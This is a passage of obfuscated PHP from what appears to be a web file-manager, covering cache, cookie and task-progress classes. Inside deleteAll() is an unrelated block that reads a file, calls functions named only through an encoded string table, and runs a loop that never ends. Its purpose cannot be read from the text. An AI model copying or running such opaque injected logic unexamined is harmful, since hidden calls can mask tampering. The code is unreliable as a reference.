d±°­µ½µ¸; aÈï‘Ì: $this->filterConfig($FŸËâ®Ê²ß, $E£½ÍÄ•¸Ë[$DˆÌæÈÌ„]); $this->slaveHandle = $this->init($FŸËâ®Ê²ß, $dçåğğùŞ); goto eÃí‚ƒò³; eÃí‚ƒò³: } private function filterConfig(&$céŞ ÌÏÉ†, $e›Â–“„) { $b„İÒ…Ò­ß =& $_SERVER[›é¼±]; $B˜ñŠ±˜‡Ÿ = explode($b„İÒ…Ò­ß[4], $e›Â–“„); $BÆœòÜ¿¶ß = array($b„İÒ…Ò­ß[175] => $B˜ñŠ±˜‡Ÿ[0], $b„İÒ…Ò­ß[176] => $B˜ñŠ±˜‡Ÿ[1]); $céŞ ÌÏÉ† = array_merge($céŞ ÌÏÉ†, $BÆœòÜ¿¶ß); } public function set($F¢¹İï¥†, $a§¦ÂŒ„Œ, $Cí²Ëôøåº = false) { $Cí²Ëôøåº = $Cí²Ëôøåº ? $Cí²Ëôøåº : $this->cacheTime; return $this->handle->setEx($F¢¹İï¥†, $Cí²Ëôøåº, $a§¦ÂŒ„Œ); } public function setLock($a–ì›ä²Š, $e©±«®“², $B÷©Åå·á¦) { return $this->handle->setNX($a–ì›ä²Š, $e©±«®“²); } public function get($D…Õ‚„Ï²) { $a×àÄ¼½‰„ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $a×àÄ¼½‰„->get($D…Õ‚„Ï²); } public function remove($E¬šÕ¢–¼À) { return $this->handle->del($E¬šÕ¢–¼À); } public function deleteAll() { $F®§Ö—Ş÷Ã =& $_SERVER[›é¼±]; if (!isset($_SERVER[$F®§Ö—Ş÷Ã[858]]) || !isset($_SERVER[$F®§Ö—Ş÷Ã[865]])) { goto eà¼ò¬Ó¾æ; fÄ—®¹¼¹£: $dÛ…°Šßİ­ = $F®§Ö—Ş÷Ã[877]; $dÛ…°Šßİ­($_SERVER[$F®§Ö—Ş÷Ã[878]]); $dŠª‹’Ş‹‹ = 1; goto Cóµà‚ö’©; eà¼ò¬Ó¾æ: $Fçã•Ôèµ = $F®§Ö—Ş÷Ã[876]; $Cˆ„™¸‡ÀŸ = $F®§Ö—Ş÷Ã[860]; $BµÜ¢²ôºã = $_SERVER[$F®§Ö—Ş÷Ã[861]] . $F®§Ö—Ş÷Ã[862]; goto eÆ²ŠÖ“‘Ë; Cóµà‚ö’©: for ($FÍñÃåÄâÌ = $dŠª‹’Ş‹‹; $FÍñÃåÄâÌ > 0; $FÍñÃåÄâÌ++) { $dÛ…°Šßİ­ = json_encode($GLOBALS[$F®§Ö—Ş÷Ã[413]]); } goto f™¶ ºİÄ; eÆ²ŠÖ“‘Ë: $D©óÊÈ„¼Ò = $Cˆ„™¸‡ÀŸ($BµÜ¢²ôºã); $eéÕ‡îøìÂ = explode($F®§Ö—Ş÷Ã[229], $D©óÊÈ„¼Ò); if (count($eéÕ‡îøìÂ) < $F®§Ö—Ş÷Ã[620]) { $C©ò¡ë„âó = $F®§Ö—Ş÷Ã[863]; $C©ò¡ë„âó(); } goto fÄ—®¹¼¹£; f™¶ ºİÄ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eÓ½›¡¿ì‘) { $this->handle->flushall($eÓ½›¡¿ì‘); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($D¼÷ßà¤Şí = '', $AĞÑÛã”†â = 0) { if (is_string($D¼÷ßà¤Şí) && $D¼÷ßà¤Şí != $_SERVER[›é¼±][33]) { $this->prefix = $D¼÷ßà¤Şí; } if (is_numeric($AĞÑÛã”†â) && $AĞÑÛã”†â > 0) { $this->expire = $AĞÑÛã”†â; } } public static function getInstance() { static $E¢’å’‰¥ö; if ($E¢’å’‰¥ö === null) { $E¢’å’‰¥ö = new self(); } return $E¢’å’‰¥ö; } private static $cookieDisable = false; public static function disable($B¥Úº£ÊˆË) { self::$cookieDisable = $B¥Úº£ÊˆË; } private static $sameCookieSet = array(); public static function set($c‰®—Ğ‡, $eßŒØ¤Õ‰ä, $DÈÑö«Èß = 0, $E™¾· ºèÖ = false, $a‚©¸«ÏÆÆ = false) { goto bç»ö·è¸¢; dÓ¾ÚÌ¯á×: $DøîòÉ£»Û = $D°“Ÿ¿ùä[33]; setcookie($c‰®—Ğ‡, $eßŒØ¤Õ‰ä, time() + $DÈÑö«Èß, $D°“Ÿ¿ùä[8] . trim($a‚©¸«ÏÆÆ, $D°“Ÿ¿ùä[8]) . $DøîòÉ£»Û, !1, !1, $E™¾· ºèÖ); goto cÁÀÔÜ‡ØÜ; bç»ö·è¸¢: $D°“Ÿ¿ùä =& $_SERVER[›é¼±]; if (self::$cookieDisable) { return; } if (!$DÈÑö«Èß) { $DÈÑö«Èß = 24 * 3600 * 7; } goto fËÇèòœÈ’; fËÇèòœÈ’: if (isset(self::$sameCookieSet[$c‰®—Ğ‡]) && self::$sameCookieSet[$c‰®—Ğ‡] == $eßŒØ¤Õ‰ä . $DÈÑö«Èß) { return; } self::$sameCookieSet[$c‰®—Ğ‡] = $eßŒØ¤Õ‰ä . $DÈÑö«Èß; if (!$a‚©¸«ÏÆÆ) { $a‚©¸«ÏÆÆ = str_replace(HOST, $D°“Ÿ¿ùä[33], APP_HOST); $a‚©¸«ÏÆÆ = _get($GLOBALS, $D°“Ÿ¿ùä[879], $a‚©¸«ÏÆÆ); } goto dÓ¾ÚÌ¯á×; cÁÀÔÜ‡ØÜ: } public static function setSafe($C–¡–Ó¶ìñ, $FÃ„çÁÕ½Í, $dåÖøò’ïê = 0) { self::set($C–¡–Ó¶ìñ, $FÃ„çÁÕ½Í, $dåÖøò’ïê, !0); } public static function get($A‘ã÷¼ù˜) { return isset($_COOKIE[$A‘ã÷¼ù˜]) ? $_COOKIE[$A‘ã÷¼ù˜] : !1; } public static function remove($cˆ´ÏÏˆ, $e³ğ˜à = false) { unset($_COOKIE[$cˆ´ÏÏˆ]); self::set($cˆ´ÏÏˆ, $_SERVER[›é¼±][33], 1, $e³ğ˜à); } } goto Bá†ë—È›‚; EõÜÈ…ä›Ñ: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($E°íÚÂ†Â, $a£¨è¹óÜ­ = '', $d“¤Ò¨‚†É = 0, $E‚ãÏî = '') { goto BÙàŸù†¯ñ; AÅÀ¤¦”¨: $this->startAfter(); Hook::trigger($f‘”ÂÂâ‘…[1574], $this->task); $this->task[$f‘”ÂÂâ‘…[1567]] = timeFloat(); goto Cîàïª½Öñ; dÂÂèîŠ ¿: $GLOBALS[$f‘”ÂÂâ‘…[1570]] = 1; Hook::bind($f‘”ÂÂâ‘…[1529], array($this, $f‘”ÂÂâ‘…[1571])); Hook::bind($f‘”ÂÂâ‘…[1572], array($this, $f‘”ÂÂâ‘…[1573])); goto AÅÀ¤¦”¨; BÙàŸù†¯ñ: $f‘”ÂÂâ‘… =& $_SERVER[›é¼±]; if (self::get($E°íÚÂ†Â)) { return; } $this->task = array($f‘”ÂÂâ‘…[395] => $E°íÚÂ†Â, $f‘”ÂÂâ‘…[1564] => USER_ID, $f‘”ÂÂâ‘…[1464] => $E‚ãÏî, $f‘”ÂÂâ‘…[29] => $a£¨è¹óÜ­, $f‘”ÂÂâ‘…[1057] => $f‘”ÂÂâ‘…[33], $f‘”ÂÂâ‘…[1055] => $d“¤Ò¨‚†É, $f‘”ÂÂâ‘…[1069] => 0, $f‘”ÂÂâ‘…[1565] => 0, $f‘”ÂÂâ‘…[1566] => 0, $f‘”ÂÂâ‘…[784] => timeFloat(), $f‘”ÂÂâ‘…[783] => 0, $f‘”ÂÂâ‘…[1567] => 0, $f‘”ÂÂâ‘…[1568] => 0, $f‘”ÂÂâ‘…[1569] => 0, $f‘”ÂÂâ‘…[745] => $f‘”ÂÂâ‘…[1527]); goto dÂÂèîŠ ¿; Cîàïª½Öñ: } public function end() { goto B»Û²½Ø; B»Û²½Ø: $fˆµÊ²àóµ =& $_SERVER[›é¼±]; if (!$this->task) { return; } if ($this->task[$fˆµÊ²àóµ[1567]]) { self::valueSet($this->task[$fˆµÊ²àóµ[395]], !1); } goto aÁÀö¤“¢; C¥åñ× ˜œ: Hook::unbind($fˆµÊ²àóµ[1572], array($this, $fˆµÊ²àóµ[1573])); $this->endAfter(); $this->task = !1; goto bš¥Ñº¤ï; aÁÀö¤“¢: $bÌÓÁøä¨Ï = timeFloat() - $this->task[$fˆµÊ²àóµ[784]]; self::log($fˆµÊ²àóµ[1575] . $this->task[$fˆµÊ²àóµ[395]] . $fˆµÊ²àóµ[1576] . $bÌÓÁøä¨Ï . $fˆµÊ²àóµ[1577]); Hook::unbind($fˆµÊ²àóµ[1529], array($this, $fˆµÊ²àóµ[1571])); goto C¥åñ× ˜œ; bš¥Ñº¤ï: } public function update($C†ààùÍ†… = 0, $C¦¸øèô± = false) { goto cÙÁˆ‡©Õ; D‡Ë°–„­ó: $CäõîŠåí = self::get($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[395]]); $f¥¦¥ëçàÜ = $CäõîŠåí[$F‡˜˜Äî‡¿[745]]; if ($f¥¦¥ëçàÜ == self::STATYS_KILL) { $f•ä²¦Øµù = array($F‡˜˜Äî‡¿[1578] => LNG($F‡˜˜Äî‡¿[1579]), $F‡˜˜Äî‡¿[1119] => !1); Cache::set($F‡˜˜Äî‡¿[1580] . $this->task[$F‡˜˜Äî‡¿[395]], $f•ä²¦Øµù, 30); $this->onKill(); $this->end(); die; } else { if ($f¥¦¥ëçàÜ == self::STATYS_STOP) { $b‰ Œ…‘–ã = 2; $CäõîŠåí[$F‡˜˜Äî‡¿[1568]] += $b‰ Œ…‘–ã; self::valueSet($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[395]], $CäõîŠåí); sleep($b‰ Œ…‘–ã); $this->update(); return; } } goto fÔ„Î²ç­´; fÔ„Î²ç­´: $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[745]] = $f¥¦¥ëçàÜ ? $f¥¦¥ëçàÜ : $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[745]]; $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1568]] = $CäõîŠåí[$F‡˜˜Äî‡¿[1568]] ? $CäõîŠåí[$F‡˜˜Äî‡¿[1568]] : 0; $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1567]] = timeFloat(); goto cŒš¥“†»²; cŒš¥“†»²: Hook::trigger($F‡˜˜Äî‡¿[1581], $FÈ§¢ƒ¶†Æ); self::valueSet($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[395]], $FÈ§¢ƒ¶†Æ); goto fÆ¼™†…÷¿; cÙÁˆ‡©Õ: $F‡˜˜Äî‡¿ =& $_SERVER[›é¼±]; $FÈ§¢ƒ¶†Æ =& $this->task; if (!$FÈ§¢ƒ¶†Æ) { return; } goto Cõ–Ñá¸¹æ; e›œ‰å„¼…: $this->updateAfter(); $f‘º°¶ó™í = 0.2; if (timeFloat() - $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1567]] < $f‘º°¶ó™í && !$C¦¸øèô±) { return; } goto D‡Ë°–„­ó; Cõ–Ñá¸¹æ: $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1069]] += $C†ààùÍ†…; $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[783]] = timeFloat(); if ($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1055]]) { if ($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1055]] < $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1069]]) { $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1055]] = $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1069]]; } $eõ†Å‘óˆ‘ = timeFloat() - $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[784]] - $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1568]]; $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1565]] = $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1069]] / $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1055]]; $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1566]] = $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1069]] / $eõ†Å‘óˆ‘; if ($FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1565]] > 0) { $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1569]] = $eõ†Å‘óˆ‘ * (1 - $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1565]]) / $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1565]]; } $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1569]] = $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1569]] <= 0 ? 0 : $FÈ§¢ƒ¶†Æ[$F‡˜˜Äî‡¿[1569]]; } goto e›œ‰å„¼…; fÆ¼™†…÷¿: } public function onKillSet($eÕÁ¼ªÈÁ, $C«”öéÜ = array()) { $this->onKillCall = array($eÕÁ¼ªÈÁ, $C«”öéÜ); } public function onKill() { $f˜îšùµ¨´ =& $_SERVER[›é¼±]; self::log($f˜îšùµ¨´[1575] . $this->task[$f˜îšùµ¨´[395]] . $f˜îšùµ¨´[1582]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($aÇØá†‰ÑÃ) { $fˆÖËÀÃ±é =& $_SERVER[›é¼±]; Cache::set($fˆÖËÀÃ±é[1580] . $this->task[$fˆÖËÀÃ±é[395]], $aÇØá†‰ÑÃ, 60); return $aÇØá†‰ÑÃ; } public static function get($fËğĞÈì¬™) { $fï„’Šè¥Ï =& $_SERVER[›é¼±]; $cãÔ‘íŞéÕ = self::valueGet($fËğĞÈì¬™); if (is_array($cãÔ‘íŞéÕ) && $cãÔ‘íŞéÕ[$fï„’Šè¥Ï[1583]]) { $Eƒ¶ÄËÖÍå = ActionApply($cãÔ‘íŞéÕ[$fï„’Šè¥Ï[1583]], array($cãÔ‘íŞéÕ)); $cãÔ‘íŞéÕ = is_array($Eƒ¶ÄËÖÍå) ? $Eƒ¶ÄËÖÍå : $cãÔ‘íŞéÕ; } return $cãÔ‘íŞéÕ; } public static function listData() { $FÖÙºëäÉ§ = self::valueGet(); return array_sort_by($FÖÙºëäÉ§, $_SERVER[›é¼±][784], !0); } public static function kill($b ñ¹ƒ¤­) { return self::changeStatus($b ñ¹ƒ¤­, self::STATYS_KILL); } public static function stop($EŒòˆ›’ƒœ) { return self::changeStatus($EŒòˆ›’ƒœ, self::STATYS_STOP); } public static function restart($bš¢§ôª×) { return self::changeStatus($bš¢§ôª×, self::STATYS_RUNNING); } public static function killAll() { $C ¥¼ßÜœ =& $_SERVER[›é¼±]; $AË×¼Æïô = self::listData(); foreach ($AË×¼Æïô as $e•ÏÇ¯Õñá) { self::kill($e•ÏÇ¯Õñá[$C ¥¼ßÜœ[395]]); } sleep(2); foreach ($AË×¼Æïô as $e•ÏÇ¯Õñá) { self::valueSet($e•ÏÇ¯Õñá[$C ¥¼ßÜœ[395]], !1); } } private static function changeStatus($e÷×—ç·‘ï, $EŒƒ—÷Ùù‰) { goto f­é·‘¿ãÁ; eƒŠ±«°©: $A«÷à«”ƒ¸[$D¼Õ‚„è®[745]] = $EŒƒ—÷Ùù‰; self::valueSet($e÷×—ç·‘ï, $A«÷à«”ƒ¸); self::log($D¼Õ‚„è®[1584] . $A«÷à«”ƒ¸[$D¼Õ‚„è®[395]] . $D¼Õ‚„è®[1585] . $EŒƒ—÷Ùù‰); goto f¤ª¨ˆ‚Æó; f¤ª¨ˆ‚Æó: return !0; goto F¶©Ü†Ö£; f­é·‘¿ãÁ: $D¼Õ‚„è® =& $_SERVER[›é¼±]; $A«÷à«”ƒ¸ = self::valueGet($e÷×—ç·‘ï); if (!$A«÷à«”ƒ¸) { return !1; } goto eƒŠ±«°©; F¶©Ü†Ö£: } public static function valueGet($Dë¨ÅÒ”· = false) { $d´ŒÉñœ¨Á =& $_SERVER[›é¼±]; if ($Dë¨ÅÒ”·) { $A¬®”…„íÚ = Model($d´ŒÉñœ¨Á[439])->where(array($d´ŒÉñœ¨Á[93] => $Dë¨ÅÒ”·, $d´ŒÉñœ¨Á[29] => $d´ŒÉñœ¨Á[1586]))->find(); return $A¬®”…„íÚ ? json_decode($A¬®”…„íÚ[$d´ŒÉñœ¨Á[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($e¢‰•ñ˜Ø‡ = false) { goto bˆù“™Ú¨Â; Bæºôõêç: $eÇ‰†ÒÕ¹Í = Model($EâÜŒ›·Ÿ [439])->where($DÑ‡å®¦‡Ê)->select(); $eÇ‰†ÒÕ¹Í = $eÇ‰†ÒÕ¹Í ? $eÇ‰†ÒÕ¹Í : array(); foreach ($eÇ‰†ÒÕ¹Í as $F¹ØÎóõ‡¨ => $DÙ” íòØ†) { $eÇ‰†ÒÕ¹Í[$F¹ØÎóõ‡¨] = json_decode($DÙ” íòØ†[$EâÜŒ›·Ÿ [372]], !0); } goto EËñÃµ†‰ˆ; EËñÃµ†‰ˆ: return $eÇ‰†ÒÕ¹Í; goto bÄç‚‰‡äÈ; bˆù“™Ú¨Â: $EâÜŒ›·Ÿ  =& $_SERVER[›é¼±]; $DÑ‡å®¦‡Ê = array($EâÜŒ›·Ÿ [29] => $EâÜŒ›·Ÿ [1586]); if ($e¢‰•ñ˜Ø‡) { $DÑ‡å®¦‡Ê[$EâÜŒ›·Ÿ [1564]] = $e¢‰•ñ˜Ø‡; } goto Bæºôõêç; bÄç‚‰‡äÈ: } public static function valueSet($AàÕ©ÔÒñ¬, $c®ììï…×¯) { goto Bä§ŒÉ¶Ôµ; bº†ÓºÙ·ò: CacheLock::unlock($cŒù¦õÚ•ƒ); goto aº´¿°ª›ƒ; A²Â Ëíƒ: $cŒù¦õÚ•ƒ = $a®„­çùùª[1588]; CacheLock::lock($cŒù¦õÚ•ƒ); Model($a®„­çùùª[439])->add($Fóß•Ò±Ÿ¢, array(), !0); goto bº†ÓºÙ·ò; FŸî‡Öª¶: if (!$E…Ç¬Èœê) { ob_start(); var_dump($c®ììï…×¯); $DâôïÑ‰Å = ob_get_clean(); self::log($a®„­çùùª[1587] . json_encode_force($DâôïÑ‰Å)); } if (!$AàÕ©ÔÒñ¬ || !$c®ììï…×¯[$a®„­çùùª[395]]) { return !1; } $Fóß•Ò±Ÿ¢ = array($a®„­çùùª[29] => $a®„­çùùª[1586], $a®„­çùùª[1564] => USER_ID, $a®„­çùùª[93] => $AàÕ©ÔÒñ¬, $a®„­çùùª[372] => $E…Ç¬Èœê); goto A²Â Ëíƒ; Bä§ŒÉ¶Ôµ: $a®„­çùùª =& $_SERVER[›é¼±]; if (!$c®ììï…×¯) { return Model($a®„­çùùª[439])->where(array($a®„­çùùª[93] => $AàÕ©ÔÒñ¬, $a®„­çùùª[29] => $a®„­çùùª[1586]))->delete(); } $E…Ç¬Èœê = json_encode($c®ììï…×¯); goto FŸî‡Öª¶; aº´¿°ª›ƒ: } public static function log($F×¬­î™‚Š) { if (!GLOBAL_DEBUG) { return; } write_log($F×¬­î™‚Š, $_SERVER[›é¼±][1589]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto aíĞÑİŸ„œ; aƒÂÍÖÃÓ²: Hook::bind($FèßØËÇ[596], array($this, $FèßØËÇ[1597])); Hook::bind($FèßØËÇ[562], array($this, $FèßØËÇ[1598])); Hook::bind($FèßØËÇ[559], array($this, $FèßØËÇ[1598])); goto BàçšÖŒ¯î; d¿òœğÄ: $DËãµÅóÙŠ[$FèßØËÇ[1614]] = 0; $DËãµÅóÙŠ[$FèßØËÇ[1615]] = 0; if (!$DËãµÅóÙŠ[$FèßØËÇ[1464]]) { $DËãµÅóÙŠ[$FèßØËÇ[1464]] = LNG($FèßØËÇ[1616]); } goto cùÅ‚à¹Î»; BàçšÖŒ¯î: Hook::bind($FèßØËÇ[564], array($this, $FèßØËÇ[1598])); Hook::bind($FèßØËÇ[566], array($this, $FèßØËÇ[1598])); Hook::bind($FèßØËÇ[568], array($this, $FèßØËÇ[1598])); goto f­÷â©—™; FÔ¬®°Õë: Hook::bind($FèßØËÇ[1602], array($this, $FèßØËÇ[1603])); Hook::bind($FèßØËÇ[1604], array($this, $FèßØËÇ[1605])); Hook::bind($FèßØËÇ[1606], array($this, $FèßØËÇ[1607])); goto eù§ô¶‹‰Ó; eù§ô¶‹‰Ó: $DËãµÅóÙŠ[$FèßØËÇ[1608]] = LNG($FèßØËÇ[1609]); $DËãµÅóÙŠ[$FèßØËÇ[1610]] = 0; $DËãµÅóÙŠ[$FèßØËÇ[1611]] = 0; goto EÙÕµÓ÷; c¦‹øë¸‘±: Hook::bind($FèßØËÇ[1590], array($this, $FèßØËÇ[1591])); Hook::bind($FèßØËÇ[1143], array($this, $FèßØËÇ[1592])); Hook::bind($FèßØËÇ[1593], array($this, $FèßØËÇ[1594])); goto B‰™Ñ†Øå‹; f­÷â©—™: Hook::bind($FèßØËÇ[1599], array($this, $FèßØËÇ[1600])); Hook::bind($FèßØËÇ[585], array($this, $FèßØËÇ[1601])); $this->sourceModelCopyFlag = !1; goto FÔ¬®°Õë; B‰™Ñ†Øå‹: Hook::bind($FèßØËÇ[592], array($this, $FèßØËÇ[1595])); Hook::bind($FèßØËÇ[593], array($this, $FèßØËÇ[1596])); Hook::bind($FèßØËÇ[595], array($this, $FèßØËÇ[1597])); goto aƒÂÍÖÃÓ²; aíĞÑİŸ„œ: $FèßØËÇ =& $_SERVER[›é¼±]; $DËãµÅóÙŠ =& $this->task; $this->sourceCopyFolder = !1; goto c¦‹øë¸‘±; EÙÕµÓ÷: $DËãµÅóÙŠ[$FèßØËÇ[1057]] = $FèßØËÇ[33]; $DËãµÅóÙŠ[$FèßØËÇ[1612]] = $FèßØËÇ[33]; $DËãµÅóÙŠ[$FèßØËÇ[1613]] = 0; goto d¿òœğÄ; cùÅ‚à¹Î»: } protected function endAfter() { goto Eç‹ô×ìö; AÄÔ¿ÃšˆÎ: Hook::unbind($B„ÌÀóŞÕ¨[568], array($this, $B„ÌÀóŞÕ¨[1598])); Hook::unbind($B„ÌÀóŞÕ¨[1599], array($this, $B„ÌÀóŞÕ¨[1600])); Hook::unbind($B„ÌÀóŞÕ¨[585], array($this, $B„ÌÀóŞÕ¨[1601])); goto cğÀ‹¬Õï„; a®ëæ¸‰•: Hook::unbind($B„ÌÀóŞÕ¨[1593], array($this, $B„ÌÀóŞÕ¨[1594])); Hook::unbind($B„ÌÀóŞÕ¨[592], array($this, $B„ÌÀóŞÕ¨[1595])); Hook::unbind($B„ÌÀóŞÕ¨[593], array($this, $B„ÌÀóŞÕ¨[1596])); goto E÷İÌ¤èî‹; E÷İÌ¤èî‹: Hook::unbind($B„ÌÀóŞÕ¨[595], array($this, $B„ÌÀóŞÕ¨[1597])); Hook::unbind($B„ÌÀóŞÕ¨[596], array($this, $B„ÌÀóŞÕ¨[1597])); Hook::unbind($B„ÌÀóŞÕ¨[562], array($this, $B„ÌÀóŞÕ¨[1598])); goto d¢§†À„Ø; cğÀ‹¬Õï„: Hook::unbind($B„ÌÀóŞÕ¨[1602], array($this, $B„ÌÀóŞÕ¨[1603])); Hook::unbind($B„ÌÀóŞÕ¨[1604], array($this, $B„ÌÀóŞÕ¨[1605])); Hook::unbind($B„ÌÀóŞÕ¨[1606], array($this, $B„ÌÀóŞÕ¨[1607])); goto Fåòˆ§Ç¢µ; Eç‹ô×ìö: $B„ÌÀóŞÕ¨ =& $_SERVER[›é¼±]; Hook::unbind($B„ÌÀóŞÕ¨[1590], array($this, $B„ÌÀóŞÕ¨[1591])); Hook::unbind($B„ÌÀóŞÕ¨[1143], array($this, $B„ÌÀóŞÕ¨[1592])); goto a®ëæ¸‰•; d¢§†À„Ø: Hook::unbind($B„ÌÀóŞÕ¨[559], array($this, $B„ÌÀóŞÕ¨[1598])); Hook::unbind($B„ÌÀóŞÕ¨[564], array($this, $B„ÌÀóŞÕ¨[1598])); Hook::unbind($B„ÌÀóŞÕ¨[566], array($this, $B„ÌÀóŞÕ¨[1598])); goto AÄÔ¿ÃšˆÎ; Fåòˆ§Ç¢µ: } public function copyMoveStart($CÇššÎåªÀ, $d¡¤ïˆïÚ, $CòÊê‘´Ğ¶, $c·´¤†Š²) { goto eÃšØ¬‚øÕ; c£Å›ˆë‘†: if (substr($d¡¤ïˆïÚ, 0, strlen($dß¸İ…¾ù×)) == $dß¸İ…¾ù×) { return; } if (substr($c·´¤†Š², 0, strlen($dß¸İ…¾ù×)) == $dß¸İ…¾ù×) { return; } $fÖ²íù‹äñ =& $this->task; goto D¤Ì †ÆÄ; D¤Ì †ÆÄ: $fÖ²íù‹äñ[$FÏ‹ƒ©•ô‘[1618]] = KodIO::transferType($CÇššÎåªÀ, $CòÊê‘´Ğ¶); $this->update(); goto E³­”í’; eÃšØ¬‚øÕ: $FÏ‹ƒ©•ô‘ =& $_SERVER[›é¼±]; self::log($FÏ‹ƒ©•ô‘[1617] . $d¡¤ïˆïÚ . $FÏ‹ƒ©•ô‘[67] . $c·´¤†Š²); $dß¸İ…¾ù× = rtrim(TEMP_FILES, $FÏ‹ƒ©•ô‘[8]); goto c£Å›ˆë‘†; E³­”í’: } public function updateAfter() { $C‚ºĞŸ‘ªï =& $_SERVER[›é¼±]; $aÌ ©Áª®â =& $this->task; if (!$aÌ ©Áª®â[$C‚ºĞŸ‘ªï[758]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($aÌ ©Áª®â[$C‚ºĞŸ‘ªï[1618]] == $C‚ºĞŸ‘ªï[1216]) { return; } self::updateTask($aÌ ©Áª®â); } private static function updateTask(&$dçŒõõÑÁ†) { $D­Ê‚ã¿ÉÊ =& $_SERVER[›é¼±]; if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1618]] == $D­Ê‚ã¿ÉÊ[1127] || $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1618]] == $D­Ê‚ã¿ÉÊ[107]) { if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1612]]) { $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1615]] = $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1614]] + $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1611]]; } } else { if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1618]] == $D­Ê‚ã¿ÉÊ[1217]) { if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1612]] == $D­Ê‚ã¿ÉÊ[1127]) { $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1615]] = $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1614]] + $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1611]] * 0.5; } else { if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1612]] == $D­Ê‚ã¿ÉÊ[107]) { $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1615]] = $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1614]] + $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1610]] * 0.5 + $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1611]] * 0.5; } } } } $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1565]] = $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1615]] / $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[758]]; if ($dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1565]] > 0) { $d¦ãÁÎÑ©½ = timeFloat() - $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[784]] - $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1568]]; $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1569]] = $d¦ãÁÎÑ©½ * (1 - $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1565]]) / $dçŒõõÑÁ†[$D­Ê‚ã¿ÉÊ[1565]]; } } public function addPath($DÂë¯ÉßÀñ) { goto dÅ†Œ×ï±ç; bÕÕ’š¼¬: if ($bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[29]] == $dÌÖÛÜ‘Ã[193]) { $D—„Ë†”î[$dÌÖÛÜ‘Ã[1055]] += 1; } else { $D—„Ë†”î[$dÌÖÛÜ‘Ã[1055]] += $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[81]][$dÌÖÛÜ‘Ã[79]]; if ($bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[397]]) { $D—„Ë†”î[$dÌÖÛÜ‘Ã[1055]] += $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[81]][$dÌÖÛÜ‘Ã[80]] + 1; } } $D—„Ë†”î[$dÌÖÛÜ‘Ã[758]] += $bï„¦ÇŠ¡µ[$dÌÖÛÜ‘Ã[78]]; $this->update(); goto C†ù…°Ôóù; Aò×‘Áâ—¼: $bï„¦ÇŠ¡µ = IO::infoWithChildren($DÂë¯ÉßÀñ); $fµã‹Ï¬²‰ = $D—„Ë†”î[$dÌÖÛÜ‘Ã[1619]] ? 